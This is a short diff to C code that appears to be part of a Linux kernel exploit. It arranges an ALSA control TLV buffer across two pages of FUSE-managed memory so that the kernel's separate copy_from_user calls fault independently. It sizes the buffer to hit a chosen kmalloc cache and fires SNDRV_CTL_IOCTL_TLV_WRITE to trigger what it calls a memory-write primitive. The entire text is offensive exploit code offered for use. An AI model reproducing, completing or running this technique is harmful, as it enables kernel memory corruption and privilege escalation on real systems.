@@ -3,7 +3,9 @@
 #include <fcntl.h>
 #include <string.h>
 #include <stdio.h>
+#include <sys/mman.h>
 #include "snd_mwp.h"
+#include "utils.h"
 
 static int snd_card_fd;
 static int kctl_numid;
@@ -35,18 +37,25 @@ void init_audio()
 void trigger_mwp(void *fuse_managed_memory)
 {
     printf("[+][%s]", __func__ );
-    struct snd_ctl_tlv *buf = fuse_managed_memory; 
+    char *base = (char *)fuse_managed_memory;
+
+    /* 
+     * Buffer header is at the end of first page, buffer body is in the second page, 
+     * in this way we have two page faults and manage the two kernel copy_from_user
+     * independently
+     */
+    struct snd_ctl_tlv *buf = (struct snd_ctl_tlv *)(base + 4096 - 8); 
     buf->numid = kctl_numid;
     
     // This should be the allocation size for the kmalloc-cache
     // from which we want to allocate
     buf->length = 128;
-    printf("[+][%s] MWP about to be triggered...", __FILE__);
+    printf("[+][%s] MWP about to be triggered: buf->numid = %d, buf->length = %d", 
+            __FILE__, buf->numid, buf->length);
 
     // This should call kctl->tlv.c to snd_ctl_elem_user_tlv,
     // that function will call replace_user_tlv thanks to the WRITE operation
     int ret = ioctl(snd_card_fd, SNDRV_CTL_IOCTL_TLV_WRITE, buf);
     assert(ret >= 0);
-
 }
 
